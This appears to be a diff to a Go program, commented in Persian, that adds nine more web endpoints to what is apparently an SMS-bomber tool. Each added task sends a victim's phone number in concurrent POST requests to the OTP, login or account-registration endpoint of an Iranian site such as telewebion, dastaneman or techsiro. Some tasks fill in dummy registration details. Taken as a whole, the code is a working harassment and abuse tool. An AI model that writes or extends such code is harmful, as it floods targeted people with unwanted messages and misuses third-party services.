@@ -722,7 +722,97 @@ func main() {
 			}
 			sendJSONRequest(ctx, "https://api.payping.ir/v1/user/Register", payload, &wg, ch)
 		}
+		// gateway.telewebion.com (SMS - POST Form) - بر اساس نمونه پایتون
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("code", "98")
+			formData.Set("phone", phone) // استفاده مستقیم از شماره تلفن ورودی
+			formData.Set("smsStatus", "default")
+			sendFormRequest(ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", formData, &wg, ch)
+		}
 
+		// microele.com (Registration - POST Form) - بر اساس نمونه پایتون - Endpoint ثبت نام
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("id_customer", "") // طبق نمونه پایتون خالی
+			formData.Set("back", ",my-account") // طبق نمونه پایتون
+			formData.Set("firstname", "123") // طبق نمونه پایتون
+			formData.Set("lastname", "123") // طبق نمونه پایتون
+			formData.Set("password", "123456") // طبق نمونه پایتون
+			formData.Set("action", "register") // طبق نمونه پایتون
+			formData.Set("username", phone) // بر اساس نمونه پایتون ('0' + number) که با phone در Golang متناظر است
+			formData.Set("ajax", "1") // طبق نمونه پایتون
+			sendFormRequest(ctx, "https://www.microele.com/login?back=my-account", formData, &wg, ch)
+		}
+
+		// telketab.com (POST Form) - بر اساس نمونه پایتون - به نظر Endpoint تایید کد است
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("identity", phone) // بر اساس نمونه پایتون ('0' + number) که با phone در Golang متناظر است
+			formData.Set("secret", "") // طبق نمونه پایتون خالی (نشان دهنده ورودی OTP؟)
+			formData.Set("plugin", "otp_field_sms_processor") // طبق نمونه پایتون
+			formData.Set("key", "otp_field_user_auth_form__otp_sms") // طبق نمونه پایتون
+			sendFormRequest(ctx, "https://telketab.com/opt_field/check_secret", formData, &wg, ch) // به نظر Endpoint تایید کد است
+		}
+
+		// dastaneman.com (SMS - POST Form) - بر اساس نمونه پایتون - نیاز به فرمت "0098" + بدون صفر اول
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			// ساخت فرمت "0098" + شماره بدون صفر اول
+			formattedPhone := "0098" + getPhoneNumberNoZero(phone)
+			formData.Set("mobile", formattedPhone)
+			sendFormRequest(ctx, "https://dastaneman.com/User/SendCode", formData, &wg, ch)
+		}
+
+		// techsiro.com (SMS - POST Form) - بر اساس نمونه پایتون - _token ممکن است پویا باشد
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("client", "web") // طبق نمونه پایتون
+			formData.Set("method", "POST") // طبق نمونه پایتون
+			formData.Set("_token", "") // طبق نمونه پایتون خالی (ممکن است پویا باشد)
+			formData.Set("mobile", phone) // بر اساس نمونه پایتون ('0' + number) که با phone در Golang متناظر است
+			sendFormRequest(ctx, "https://techsiro.com/send-otp", formData, &wg, ch)
+		}
+
+		// shimashoes.com (Registration - POST Form) - بر اساس نمونه پایتون - Endpoint ثبت نام - استفاده از فیلد email
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("email", phone) // استفاده از شماره تلفن در فیلد email
+			sendFormRequest(ctx, "https://shimashoes.com/api/customer/member/register/", formData, &wg, ch) // Endpoint ثبت نام
+		}
+
+		// eaccount.ir (SMS - POST JSON) - بر اساس نمونه پایتون (شبیه JSON)
+		wg.Add(1)
+		tasks <- func() {
+			payload := map[string]interface{}{
+				"mobile_phone": phone, // بر اساس نمونه پایتون ("0" + number + "") که با phone در Golang متناظر است
+			}
+			sendJSONRequest(ctx, "https://eaccount.ir/api/v1/sessions/login_request", payload, &wg, ch)
+		}
+
+		// queenaccessories.ir (SMS - POST JSON) - بر اساس نمونه پایتون (شبیه JSON)
+		wg.Add(1)
+		tasks <- func() {
+			payload := map[string]interface{}{
+				"mobile_phone": phone, // بر اساس نمونه پایتون ("0" + number + "") که با phone در Golang متناظر است
+			}
+			sendJSONRequest(ctx, "https://queenaccessories.ir/api/v1/sessions/login_request", payload, &wg, ch)
+		}
+
+		// vinaaccessory.com (SMS - POST JSON) - بر اساس نمونه پایتون (شبیه JSON)
+		wg.Add(1)
+		tasks <- func() {
+			payload := map[string]interface{}{
+				"mobile_phone": phone, // بر اساس نمونه پایتون ("0" + number + "") که با phone در Golang متناظر است
+			}
+			sendJSONRequest(ctx, "https://vinaaccessory.com/api/v1/sessions/login_request", payload, &wg, ch)
+		}
 	}
 	// --- پایان حلقه اصلی ---
 
